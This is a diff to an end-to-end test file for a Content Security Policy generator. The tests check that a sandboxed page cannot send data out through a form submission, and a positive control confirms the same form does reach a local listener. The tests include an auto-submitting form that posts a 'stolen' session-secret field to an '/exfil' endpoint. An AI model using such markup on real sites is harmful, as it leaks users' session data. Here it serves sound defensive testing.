@@ -1,4 +1,5 @@
-import { test, expect, ORIGIN } from '../../../test/e2e/fixture';
+import { test, expect } from '../../../test/e2e/fixture';
+import { useRecorder } from '../../../test/e2e/recorder';
 import { generateCSP } from '@src/lib/csp/csp-generator';
 
 /**
@@ -6,7 +7,11 @@ import { generateCSP } from '@src/lib/csp/csp-generator';
  * Runs on the shared e2e harness (test/e2e/fixture.ts).
  */
 
-const EXFIL = `${ORIGIN}/playground/test-assets/local-image.svg`;
+// Evidence for 12.2 (backlog T5): the form-action violation reported on the host where the engine raises
+// it before the submission is abandoned, and a listener outside the browser that the form targets. A
+// permitted form-action cannot be the positive control: a submission is a navigation, which the wrapper's
+// frame-src 'none' refuses anyway (S10). So the control submits the same form from a frame on the host page.
+const recorder = useRecorder();
 
 test('12.1 the default policy restricts base-uri and form-action, which have no fallback', () => {
     const policy = generateCSP({
@@ -26,20 +31,32 @@ test('12.1 the default policy restricts base-uri and form-action, which have no 
     expect(policy, 'form-action has no default-src fallback').toContain("form-action 'none'");
 });
 
-test('12.2 form-action: a GET form cannot exfiltrate to a non-allowlisted target', async ({ sandbox, page }) => {
-    const reached: string[] = [];
-    page.on('request', r => { if (r.url().startsWith(EXFIL)) reached.push(r.url()); });
+const formMarkup = (action: string) => `<form id="f" action="${action}" method="GET">
+      <input name="stolen" value="session-secret">
+    </form>
+    <script>document.getElementById('f').submit();</script>`;
 
+test('12.2 form-action: a GET form cannot exfiltrate to a non-allowlisted target', async ({ sandbox, page, browserName }) => {
     // allow-forms is a sanctioned value in SAFE_CAPABILITIES
     await sandbox.mount({ capabilities: ['allow-scripts', 'allow-forms'] });
-    await sandbox.load(`<html><head><title>t</title></head><body>
-        <form id="f" action="${EXFIL}" method="GET">
-          <input name="stolen" value="session-secret">
-        </form>
-        <script>document.getElementById('f').submit();</script>
-    </body></html>`);
+    await sandbox.load(`<html><head><title>t</title></head><body>${formMarkup(`${recorder.blocked}/exfil`)}</body></html>`);
 
-    await page.waitForTimeout(3000);
+    if (browserName === 'chromium') {
+        // Measured 2026-10-13: in Chromium no report reaches the host. The guest document is replaced by the
+        // refused submission's error page first, so the listener outside the browser is the evidence there.
+        await page.waitForTimeout(2000);
+    } else {
+        expect(await sandbox.waitForViolation('form-action', `${recorder.blocked}/exfil`)).toBeTruthy();
+    }
+    expect(recorder.paths('blocked'), 'form submission escaped the network policy').toEqual([]);
+});
 
-    expect(reached, 'form submission escaped the network policy').toHaveLength(0);
+test('12.2 positive control: the same form submitted from a frame on the host page reaches the listener', async ({ sandbox }) => {
+    await sandbox.page.evaluate((markup) => {
+        const frame = document.createElement('iframe');
+        frame.setAttribute('sandbox', 'allow-scripts allow-forms');
+        frame.srcdoc = markup;
+        document.body.appendChild(frame);
+    }, formMarkup(`${recorder.blocked}/exfil`));
+    await recorder.waitFor('blocked', '/exfil?stolen=session-secret');
 });
